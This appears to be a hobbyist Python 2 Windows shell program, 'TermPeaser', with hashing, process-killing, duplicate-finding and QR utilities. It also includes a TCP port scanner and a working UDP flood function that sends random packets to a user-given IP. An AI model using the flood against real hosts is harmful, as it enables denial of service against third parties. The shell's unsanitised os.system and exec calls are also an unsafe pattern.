import os, sys, win32pdh, platform, getpass, socket, hashlib, pyperclip, datetime, urllib, utils, random, time

link = "https://github.com/Peaser/TermPeaser/blob/master/TermPeaser.py"
rawlink = "https://raw.githubusercontent.com/Peaser/TermPeaser/master/TermPeaser.py"
__version__ = '0.2.1'

herenow = os.getcwd()

try:
    latest = urllib.urlopen('https://raw.githubusercontent.com/Peaser/TermPeaser/master/Version.txt').read()
    if "Lightspeed" in latest:
        raise Exception, "Update request blocked by web filter."
    if latest == __version__:
        uddisp = "This version is up to date."
    else:
        uddisp = "This version is not up to date.\nGet latest version (%s) at %s" % (latest, link)
except Exception, e:
    uddisp = "Unable to verify version. %s" % str(e).capitalize()

print "TermPeaser - version %s" % __version__
print uddisp
print "Type 'cmds' for commands."

print "#"*80
def copyit(alg, txt):
    iscopy = raw_input("Copy to clipboard?\n(type 'c', otherwise it will not be copied.)\n")
    if iscopy.lower() == 'c':
        pyperclip.copy(alg(txt).hexdigest())
        print "\nOutput copied to clipboard.\n"
    else:pass
def portscan():
    try:
        yn = ['y', 'n']
        portList = [21,22,23,53,80,109,110,443]

        ip = [i[4][0] for i in socket.getaddrinfo(socket.gethostname(), None)]
        print "System IP address = "+str(ip[-1])+'\n'

        Ip2scan = raw_input("Enter IP address: ")
        Ipscanning = socket.gethostbyname(Ip2scan)
        pl = raw_input("scan ports in portlist? "+str(portList)+"\n'y' or 'n':")
        if pl.lower() not in yn:
            scanpl = False
        else:
            if pl.lower() == 'y':
                scanpl = True
            if pl.lower() == 'n':
                scanpl = False
        disp = raw_input("Display closed ports?\n'y' or 'n':")

        if disp.lower() not in yn:
            display = False
        else:
            if disp.lower() == 'y':
                display = True
            if disp.lower() == 'n':
                display = False

        print "Scanning", Ipscanning

        if scanpl == True:
            for port in portList:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                okay = sock.connect_ex((Ipscanning, port))
                if okay == 0:
                    print "Port {}: \t Open <---".format(port)
                if okay !=0:
                    if display == True:
                        print "Port {}: \t Closed".format(port)
                    if display == False:
                        pass
                sock.close()

        if scanpl == False:
            for port in range(1,1025):
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                okay = sock.connect_ex((Ipscanning, port))
                if okay == 0:
                    print "Port {}: \t Open <---".format(port)
                if okay !=0:
                    if display == True:
                        print "Port {}: \t Closed".format(port)
                    if display == False:
                        pass
                sock.close()

        print "Scan done"
    except Exception, e:
        print "Error! %s" % str(e)
def dupef(d):
    if d[-1:] != '/':d = d+'/'
    print "Looking in %s" %d
    files = [i for i in os.listdir(d) if os.path.isfile(d+i)]
    names = []
    hashes = []

    for i in files:
        try:
            k = hashlib.md5(open(d+i, 'rb').read()).hexdigest()
            print "%d/%d - %s - %s"%(files.index(i)+1, len(files), utils.shorten(i, 10), k)
            names.append(i)
            hashes.append(k)
        except:
            print "%d/%d - %s - %s"%(files.index(i)+1, len(files), utils.shorten(i, 10), "ERROR READING FILE.")

    dupes = utils.dupecheck(hashes)
    nind =[hashes.index(i) for i in dupes]
    newnames = []
    for i in nind:
        newnames.append(names[i])
    full = zip(dupes, newnames)
    def write(named):
        with open(named+".txt", 'w') as dupesoc:
            for i in full:
                dupesoc.write(' -> '.join(i)+'\n')
            dupesoc.close()
    print "Found %d Duplicates:\n%s" % (len(full), '\n'.join(['--> '+i[1] for i in full]))
    r = raw_input("Save to text file? (y/n): ").lower()
    confirming = True
    while confirming:
        if r == 'y':
            write('Duplicates')
            confirming = False
        if r == 'n':
            confirming = False
def fdupef(d):
    if d[-1:] != '/':d = d+'/'
    print "Looking in %s" %d
    files = []
    print "Gathering Files..."
    for aaa, bbb, ccc in os.walk(d):
        try:
            for i in ccc:
                if os.path.isfile(d+i):
                    files.append(i)
        except KeyboardInterrupt:
            break
    names = []
    hashes = []

    for i in files:
        try:
            k = hashlib.md5(open(d+i, 'rb').read()).hexdigest()
            print "%d/%d - %s - %s"%(files.index(i)+1, len(files), utils.shorten(i, 10), k)
            names.append(i)
            hashes.append(k)
        except:
            print "%d/%d - %s - %s"%(files.index(i)+1, len(files), utils.shorten(i, 10), "ERROR READING FILE.")

    dupes = utils.dupecheck(hashes)
    nind =[hashes.index(i) for i in dupes]
    newnames = []
    for i in nind:
        newnames.append(names[i])
    full = zip(dupes, newnames)
    def write(named):
        with open(named+".txt", 'w') as dupesoc:
            for i in full:
                dupesoc.write(' -> '.join(i)+'\n')
            dupesoc.close()
    print "Found %d Duplicate(s):\n%s" % (len(full), '\n'.join(['--> '+i[1] for i in full]))
    r = raw_input("Save to text file? (y/n): ").lower()
    confirming = True
    while confirming:
        if r == 'y':
            write('Duplicates')
            confirming = False
        if r == 'n':
            confirming = False

def QrCode(data):
    import qrcode,hashlib
    #from PIL import *
    qr = qrcode.QRCode(
        version=1,
        error_correction=qrcode.constants.ERROR_CORRECT_L,
        box_size=50,
        border=0,)
    dhash = hashlib.md5(data).hexdigest()
    qr.add_data(data)
    qr.make(fit=True)
    img = qr.make_image()
    img.save(herenow+'/'+dhash[:(len(dhash)/2)]+".PNG")

def flood(iss, ss, ds):
    IP = iss
    PSize = int(ss)
    Duration = int(ds)
    print("parameters: %s %s %s") % (iss, ss, ds)

    Clock = (lambda:0, time.clock)[Duration > 0]
    Duration = (1, (Clock() + Duration))[Duration > 0]

    Packet = random._urandom(PSize)
    Socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    print("flooding %s with %s bytes for %s seconds." % (IP, PSize, Duration or 'Infinite'))

    while True:
        try:
            if (Clock() < Duration):
                Port = random.randint(1, 65535)
                Socket.sendto(Packet, (IP, Port))
            else:
                break
        except KeyboardInterrupt:
            print "Flood stopped by user."
            break
    print "Flood Ended."

def bhMain():
    going = True
    while going:
        try:
            def MAINTHING():
                global copyit
            	print "MegaHash -- Created by Peaser in Python -- peaser92897@gmail.com\n\nYour hash will be printed here, as well as stored in MegaHash.txt.\n\n"
            	good = 0
            	algorithms = ['md5', 'sha1', 'sha224', 'sha256', 'sha384', 'sha512']
            	secondarycomms = ['all_algs', 'p', 'help']

                def defAlg():

                    funcmap = {
                    'md5': hashlib.md5,
                    'sha1': hashlib.sha1,
                    'sha224': hashlib.sha224,
                    'sha256': hashlib.sha256,
                    'sha384': hashlib.sha384,
                    'sha512': hashlib.sha512
                    }
                    getting = True
                    while getting:
                        try:
                            galg = raw_input("Choose an algorithm.\n%s" % '\n'.join(algorithms)+'\n>')
                            funcuse = funcmap[galg]
                            getting = False
                        except: pass
                    print "Create a password file."
                    us = raw_input("Username:")
                    ps = getpass.getpass("Password (not displayed):")
                    with open("x.p", "w") as doth:
                        data = '\n'.join([funcuse(us).hexdigest(),
                                               funcuse(ps).hexdigest(),
                                               funcuse(galg).hexdigest()])
                        doth.write(data.encode('bz2'))
                        doth.close()
                    print "Password file created"
            	while good == 0:

            		helpme = raw_input('Please enter desired algorithm from the following list:\n\n' + str(algorithms) + '\n\nOr try a command:\n\n' + str(secondarycomms) + '\n\n-->')
            		if helpme not in algorithms+secondarycomms:
            			print 'Please use a real command.\n'
            		else:
            			if helpme == 'md5':
            				md5r = raw_input("Please type some text to encode.\n\n-->")
            				with open("MegaHash.txt", "a") as md5doc:
            					md5doc.write("'" + md5r + "' in MD5 - " + hashlib.md5(md5r).hexdigest() + '\n\n')
            					md5doc.close()
            				print '\n' + hashlib.md5(md5r).hexdigest() + " - '" + md5r + "' as md5 - appended to Megahash.txt\n"
            				copyit(hashlib.md5, md5r)
            				#good = 0

            			if helpme == 'sha1':
            				sh1r = raw_input("Please type some text to encode.\n\n-->")
            				with open("MegaHash.txt", "a") as sha1doc:
            					sha1doc.write("'" + sh1r + "' in SHA1 - " + hashlib.sha1(sh1r).hexdigest() + '\n\n')
            					sha1doc.close()
            				print '\n' + hashlib.sha1(sh1r).hexdigest() + " - '" + sh1r + "' as sha1 - appended to Megahash.txt\n"
            				copyit(hashlib.sha1, sh1r)
            				#good = 0

            			if helpme == 'sha224':
            				s24r = raw_input("Please type some text to encode.\n\n-->")
            				with open("MegaHash.txt", "a") as sha224doc:
            					sha224doc.write("'" + s24r + "' in SHA224 - " + hashlib.sha224(s24r).hexdigest() + '\n\n')
            					sha224doc.close()
            				print '\n' + hashlib.sha224(s24r).hexdigest() + " - '" + s24r + "' as sha224 - appended to Megahash.txt\n"
            				copyit(hashlib.sha224, s24r)
            				#good = 0

            			if helpme == 'sha256':
            				s56r = raw_input("Please type some text to encode.\n\n-->")
            				with open("MegaHash.txt", "a") as sha256doc:
            					sha256doc.write("'" + s56r + "' in SHA256 - " + hashlib.sha256(s56r).hexdigest() + '\n\n')
            					sha256doc.close()
            				print '\n' + hashlib.sha256(s56r).hexdigest() + " - '" + s56r + "' as sha256 - appended to Megahash.txt\n"
            				copyit(hashlib.sha256, s56r)
            				#good = 0

            			if helpme == 'sha384':
            				s84r = raw_input("Please type some text to encode.\n\n-->")
            				with open("MegaHash.txt", "a") as sha384doc:
            					sha384doc.write("'" + s84r + "' in SHA384 - " + hashlib.sha384(s84r).hexdigest() + '\n\n')
            					sha384doc.close()
            				print '\n' + hashlib.sha384(s84r).hexdigest() + " - '" + s84r + "' as sha384 - appended to Megahash.txt\n"
            				copyit(hashlib.sha384, s84r)
            				#good = 0

            			if helpme == 'sha512':
            				s12r = raw_input("Please type some text to encode.\n\n-->")
            				with open("MegaHash.txt", "a") as sha512doc:
            					sha512doc.write("'" + s12r + "' in SHA512 - " + hashlib.sha512(s12r).hexdigest() + '\n\n')
            					sha512doc.close()
            				print '\n' + hashlib.sha512(s12r).hexdigest() + " - '" + s12r + "' as sha512 - appended to Megahash.txt\n"
            				copyit(hashlib.sha512, s12r)
            				#good = 0

            			if helpme == 'all_algs':
            				aller = raw_input("Please type some text to encode.\n\n-->")
            				with open("MegaHash.txt", "a") as everyhash:
            					everyhash.write("'" + aller + "' in MD5 - " + hashlib.md5(aller).hexdigest() + '\n')
            					everyhash.write("'" + aller + "' in SHA1 - " + hashlib.sha1(aller).hexdigest() + '\n')
            					everyhash.write("'" + aller + "' in SHA224 - " + hashlib.sha224(aller).hexdigest() + '\n')
            					everyhash.write("'" + aller + "' in SHA256 - " + hashlib.sha256(aller).hexdigest() + '\n')
            					everyhash.write("'" + aller + "' in SHA384 - " + hashlib.sha384(aller).hexdigest() + '\n')
            					everyhash.write("'" + aller + "' in SHA512 - " + hashlib.sha512(aller).hexdigest() + '\n\n')
            					everyhash.close()
            				print "\n'" + aller + "' appended to Megahash.txt in all hashes.\n"
            				#good = 0


            			if helpme == 'p':
            				defAlg()

            			if helpme == 'help':
            				print "'md5' - prints the md5 hash of your input and saves to Megahash.txt\n"
            				print "'sha1' - prints the sha1 hash of your input and saves to Megahash.txt\n"
            				print "'sha224' - prints the sha224 hash of your input and saves to Megahash.txt\n"
            				print "'sha256' - prints the sha256 hash of your input and saves to Megahash.txt\n"
            				print "'sha384' - prints the sha384 hash of your input and saves to Megahash.txt\n"
            				print "'sha512' - prints the sha512 hash of your input and saves to Megahash.txt\n"
            				print "'all_algs' - prints the hash of your input in all algorithms and saves them to Megahash.txt\n"
            				print "'p' - Creates a '.p' file for PZstr-gen. This is the password file.\n"
            				print "'help' - brings you here.\n\n"
            				print "================================ END HELP\n\n\n"
            MAINTHING()
        except:
            going = False

def procids():
    junk, instances = win32pdh.EnumObjectItems(None,None,'process', win32pdh.PERF_DETAIL_WIZARD)
    proc_ids=[]
    proc_dict={}
    for instance in instances:
        if instance in proc_dict:
            proc_dict[instance] = proc_dict[instance] + 1
        else:
            proc_dict[instance]=0
    for instance, max_instances in proc_dict.items():
        for inum in xrange(max_instances+1):
            hq = win32pdh.OpenQuery() # initializes the query handle
            path = win32pdh.MakeCounterPath( (None,'process',instance, None, inum,'ID Process') )
            counter_handle=win32pdh.AddCounter(hq, path)
            win32pdh.CollectQueryData(hq) #collects data for the counter
            type, val = win32pdh.GetFormattedCounterValue(counter_handle, win32pdh.PDH_FMT_LONG)
            proc_ids.append((instance,str(val)))
            win32pdh.CloseQuery(hq)
    proc_ids.sort()
    return proc_ids

def formatter(t, delimiter='.', l=79):
    aa = len(''.join(str(i) for i in t))
    dashes = delimiter*(l-aa)
    return dashes.join(str(i) for i in t)

def getUt(formatted=True):
    """system uptime"""
    import uptime
    if formatted:
        de = str(datetime.timedelta(seconds=uptime.uptime())).split(":")
        return "System Uptime: %sh, %sm, %ss" % (de[0], de[1], str(round(float(de[2]), 2)))
    else:
        return "System Uptime: %s Seconds." % uptime.uptime()

while True:
    try:
        path1, path2 = os.path.split(os.getcwd())
        if path2 in ("", " "):
            path2 = '/'
        w = raw_input(getpass.getuser()+"@"+platform.system()+":"+path2+"$ ")
        if w == "":
            pass
        elif w == "exit":
            break
            sys.exit(0)
        elif w == "about":
            abt = """This is my experimental python project I did in highschool.
It is written entirely in python, using python 2.7.6, for windows.
TermPeaser utilises some(not all) terminal tools used by unix systems like 'ls', 'pwd', etcetera.
Usage for flood: flood(<IP> <Size (max = 65500)> <duration (0 = Infinite)>)
contact: peaser92897@gmail.com
version: %s
download the .py script at: %s
modules:
%s""" % (__version__, link,'\n'.join( [key for key in locals().keys()
       if isinstance(locals()[key], type(sys)) and not key.startswith('__')]))
            print(abt)
        elif w == "tasks":
            pr = procids()

            print '\n'.join(formatter(d) for d in pr)
        elif w =="killpid":
            try:
                askme = raw_input("PID:")
                stringkill ="taskkill /PID "+askme+" /f"
                os.system(stringkill)
            except Exception, e:
                print("Unable to kill PID: %s, %s" % (askme, str(e)))
        elif w =="killname":
            try:
                askme = raw_input("Name:")
                stringkill ="taskkill /IM "+askme+" /f"
                os.system(stringkill)
            except Exception, e:
                print("Unable to kill Process: %s, %s" % (askme, str(e)))
        elif w[:8] == "killpid ":
            try:
                killid = w[8:]
                stringkill ="taskkill /PID "+killid+" /f"
                os.system(stringkill)
            except Exception, e:
                print("Unable to kill PID: %s, %s" % (askme, str(e)))
        elif w[:9] == "killname ":
            try:
                killid = w[9:]
                stringkill ="taskkill /IM "+killid+".exe /f"
                os.system(stringkill)
            except Exception, e:
                print("Unable to kill Proccess: %s, %s" % (askme, str(e)))
        elif w == "sysinfo":

            #info start
            ip = str([i[4][0] for i in socket.getaddrinfo(socket.gethostname(), None)][-1])
            (op, us, cp) = utils.SysInfo('__all__')
            print "Operating System: %s" % op
            print "User: %s" % us
            print "Cpu/architecture: %s" % cp
            print("IP Address: "+ip)

        elif w == "cmds":
            aboutit = [
            ('exit','exit TermPeaser'),
            ('about','about TermPeaser'),
            ('uptime','system uptime'),
            ('tasks','lists tasks with PIDs'),
            ('killpid','kill process by PID'),
            ('killname','kill process by name'),
            ('sysinfo','list info about computer'),
            ('betahash','hashing program'),
            ('portscan','simple port scanner'),
            ('now', 'current date and time'),
            ('hashfile <file> <alg.>', 'get the <alg> checsum of file'),
            ('betahash2 <text> <alg.>', 'Lightweight, simple version of betahash (no spaces)'),
            ('eval <arguments>', 'Execute python code directly'),
            ('interpreter', 'python interpreter'),
            ('ftree', 'recursively iterate through directories/files/subdirectories.'),
            ('ftreehashlog <algorithm>', 'ftree, but hash each file and log it.'),
            ('qr <text>', 'generate a qr code'),
            ('flood <IP> <Size> <duration>', 'UDP flood (use at own risk)'),
            ('dupefind <directory>', 'Uses checksums to find duplicate files'),
            ('fdupefind <directory>', 'Combines ftree with dupefind'),
            ('getupdate', 'Download up-to-date version of TermPeaser'),
            ('other*', 'all other commands executed by command prompt.')
            ]
            print '\n'.join(formatter(d) for d in aboutit)
        elif w == "betahash":
            bhMain()
        elif w == "uptime":
            print getUt()
        elif w == "portscan":
            portscan()
        elif w.startswith("cd"):
            try:
                spe = w.split(" ")[1]
                os.chdir(spe)
            except IndexError:
                print "cd where?"
        elif w == "ls":
            os.system("dir")
        elif w == "clear":
            os.system("cls")
        elif w == "pwd":
            print os.getcwd()
        elif w == "now":
            print datetime.datetime.now()
        elif w[:4] == "yes ":
            try:
                while True:
                    print w[4:]
            except: pass
        elif w.split(" ")[0] == "hashfile":
            try:
                filename = w.split(" ")[1]
                agl = w.split(" ")[2]
                aglc = eval("hashlib.%s" % agl)
                content = open(filename, 'rb').read()
                print("%s checksum of %s is %s" % (agl, filename, aglc(content).hexdigest()))
                utils.copyclipboard(aglc(content).hexdigest())
            except Exception, e:
                print "Unable to open/hash file: %s, %s" % (filename, str(e))
        elif w.split(" ")[0] == "betahash2":
            try:
                textt = w.split(" ")[1]
                agl = w.split(" ")[2]
                aglc = eval("hashlib.%s" % agl)
                print("%s checksum of %s is %s" % (agl, textt, aglc(textt).hexdigest()))
            except Exception, e:
                print "Unable to open/hash file: %s, %s" % (filename, str(e))
        elif w[:5]== "eval ":
            try:
                exec(w[5:])
            except Exception, e:
                print "Unable to execute '%s', %s" % (w[5:], str(e))
        elif w == "interpreter":
            print "Python 2.7.6 interpreter"
            going = True
            while going:
                try:
                    command = raw_input(">>>")
                    if command.lower() in ('quit', 'stop'):
                        going = False
                    else:
                        exec(command)
                except Exception, e:
                    going = False
                    print "Error: %s" % str(e)
        elif w == "ftree":
            for a, b, c in os.walk(os.getcwd()):
                try:
                    for i in c:
                        print os.path.join(a, i)
                except KeyboardInterrupt:
                    break
        elif w.split(" ")[0] == "ftreehashlog":
            agl = w.split(" ")[1]
            aglc = eval("hashlib.%s"%agl)
            bs = ""
            for a, b, c in os.walk(os.getcwd()):
                try:
                    for i in c:
                        fpat = os.path.join(a, i)
                        print fpat
                        con = open(fpat, 'rb').read()
                        bs += fpat+' - '+aglc(con).hexdigest()+'\n'
                except KeyboardInterrupt:
                    break
            with open(herenow+'/Hashlog.txt', 'w') as thelog:
                thelog.write(bs)
                thelog.close()
        elif w[:3] == "qr ":
            print "Qr code created with data: %s"%w[3:]
            QrCode(w[3:])
        elif w[:5] == 'flood':
            try:
                things = w[6:].split(" ")
                IP = things[0]
                PSize = int(things[1])
                Duration = int(things[2])
            except IndexError:
                print "Flood Usage: flood <IP> <Size> <duration>"
            try:
                flood(IP, PSize, Duration)
            except Exception, e:
                print("Flood Failure: %s") % str(e)
        elif w[:8] == "dupefind":
            try:
                subj = w[9:]
                dupef(subj)
            except Exception, e:
                print "Unable to search directory, %s" % str(e)
        elif w[:9] == "fdupefind":
            try:
                subj = w[10:]
                fdupef(subj)
            except Exception, e:
                print "Unable to search directory, %s" % str(e)
        elif w == "getupdate":
            if latest != __version__:
                print "Current Version: %s. This version: %s. Download update?"%(latest, __version__)
            else:
                print "This version is up to date. (%s = %s) Download anyway?"%(latest, __version__)
            yn = raw_input("(y/n): ").lower()
            goi = True
            while goi:
                if yn == 'y':
                    try:
                        print "Attempting download from github..."
                        urllib.urlretrieve('https://github.com/Peaser/TermPeaser/archive/master.zip', 'TermPeaser.zip')
                    except Exception, e:
                        print "Unable to get latest version: %s" %str(e)
                    goi = False
                if yn == 'n':
                    goi = False
        else:
            print "SYSTEM COMMAND: %s" % w
            os.system(w)
    except Exception, e:
        print "An error has occured: %s" % str(e)

